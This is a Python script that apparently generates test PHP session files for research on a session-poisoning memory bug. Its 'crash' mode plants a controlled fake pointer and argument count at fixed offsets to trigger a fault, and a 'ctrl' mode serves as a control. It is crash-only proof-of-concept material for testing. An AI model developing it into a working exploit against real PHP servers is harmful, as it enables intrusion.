#!/usr/bin/env python3
"""Write a benign php_binary session file used for the post-exploit poison test."""
import argparse, os, struct

PFX = b'\x03foo' + b's:128:"'
PSTART = len(PFX)
L = 128


def build(mode):
    payload = bytearray(b'Q' * L)
    if mode == 'ctrl':
        # num_args = 0 at file offset 0x2c -> ArgumentCountError, no fault
        payload[0x2c - PSTART:0x2c - PSTART + 4] = struct.pack('<I', 0)
    elif mode == 'crash':
        # num_args = 1, arg1 pointer = 0x4141414141414141, type = IS_STRING
        payload[0x2c - PSTART:0x2c - PSTART + 4] = struct.pack('<I', 1)
        payload[0x50 - PSTART:0x50 - PSTART + 8] = struct.pack('<Q', 0x4141414141414141)
        payload[0x58 - PSTART] = 6
    elif mode == 'short':
        return b'\x03foo' + b's:3:"bar";'
    else:
        raise SystemExit('bad mode')
    return PFX + bytes(payload) + b'";'


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--out', required=True)
    ap.add_argument('--mode', choices=['ctrl', 'crash', 'short'], required=True)
    a = ap.parse_args()
    data = build(a.mode)
    os.makedirs(os.path.dirname(a.out), exist_ok=True)
    with open(a.out, 'wb') as f:
        f.write(data)
    print('mode=%s len=%d offsets: 0x2c=%s 0x50=%s 0x58=%s' % (
        a.mode, len(data),
        data[0x2c:0x30].hex(), data[0x50:0x58].hex(), data[0x58:0x59].hex()))


if __name__ == '__main__':
    main()
